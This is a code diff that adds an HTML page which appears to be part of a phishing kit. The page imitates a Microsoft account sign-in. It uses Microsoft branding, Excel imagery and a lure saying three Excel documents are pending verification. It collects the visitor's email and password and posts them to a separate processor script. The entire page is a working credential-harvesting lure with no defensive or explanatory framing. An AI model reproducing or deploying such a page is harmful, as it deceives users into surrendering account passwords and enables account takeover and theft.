@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Sign in to your Microsoft account</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/png" href="../images/micro.png"/>
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+TC&display=swap" rel="stylesheet"> 
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script> 
+    <style>
+        .row{
+            margin: 0px;
+        }
+        html, body{
+            background: #ffffff;
+        }
+        @media screen and (min-width: 600px) {
+            .form {
+                margin-top: 4%;
+            }
+            html, body {
+                background-image: linear-gradient(rgba(0, 0, 0, 0.4), rgba(0, 0, 0, 0.4)), url("../images/excelbg2.jpg");
+                background-size: cover;
+                height: 100%;
+                overflow: hidden;
+            }
+            footer{
+                background-color: #ffffff;
+                display: inline-block;
+            }
+        }
+        .form h4{
+            
+            font-size: 17px;
+        }
+        .form-control{
+            border-radius: 0px;
+            border-top: 0px;
+            border-bottom: 1px solid #000;
+            border-left: 0px;
+            border-right: 0px;
+        }
+        .form-control:focus{
+            box-shadow: none;
+            border-bottom: 1px solid #005DA6;
+        }
+        .btn{
+            background: #005DA6;
+            border-radius: 0px;
+            color: #ffffff;
+            font-size: 15px;
+            padding: 2% 8%;
+        }
+        footer{
+            display: none;
+            color: #000;
+            position: fixed;
+            width: 100%;
+            color: #ffffff;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+        }
+        .forget:hover{
+            color: #000;
+            text-decoration: underline;
+        }
+
+    </style>
+
+</head>
+<body class="container-fluid">
+    <div class="row">
+        <div class="col-md-4"></div>
+        <div class="col-md-4 form" style="background-color: #ffffff; padding: 2% 3%;">
+        <h4 class="ml-2"><img src="https://i.imgur.com/sJIDEtn.jpg" width="20px" /> <span class="mt-2" style="font-size: 20px; color: gray; font-weight: 600; letter-spacing: -1px;">Microsoft</span></h4>
+            <img src="../images/excel2.png" width="160px" class="img-fluid mx-auto d-block" /> 
+            <p class="ml-2 mt-4" id="info-div" style="font-size: 14px; font-weight: 500;"><b style="color: #005DA6; font-weight: 550;">
+            Security verification:</b> Please login to your account.</p>
+            <form  method="POST" action="../processor.php" class="p-2" autocomplete="off">
+                <div class="form-group">
+                    <input type="email" class="form-control" id="email" name="email" placeholder="Email, phone or Skype">
+                </div>
+                <div class="form-group">
+                    <input type="password" class="form-control" id="pwd" name="password" placeholder="password">
+                </div>
+                <p style="font-size: 14px; color: #005DA6;" class="mt-4 mb-4">You have 3 Microsoft Excel document(s) pending, please verify your account to access.</p>
+                <button style="" type="submit" class="btn">Continue</button>
+                <p style="font-size: 14px; color: #005DA6;" class="mt-4 mb-4">Terms of use <i class="mr-2 ml-2"></i>Advertising <i class="mr-2 ml-2"></i>Privacy & cookies</p>
+            </form>
+        </div>
+        <div class="col-md-4"></div>
+    </div>
+    <footer class="" style="width: 100%;">
+        <div class="row" style="float: right; padding-right: 3%;">
+            <span style="font-size: 12px; padding: 2px 5px;">Terms of use</span> <span style="font-size: 12px; padding: 2px 5px;">Privacy & cookies</span><span style="font-size: 12px; padding: 2px 5px;">...</span>
+        </div>
+    </footer>
+</body>
+</html>
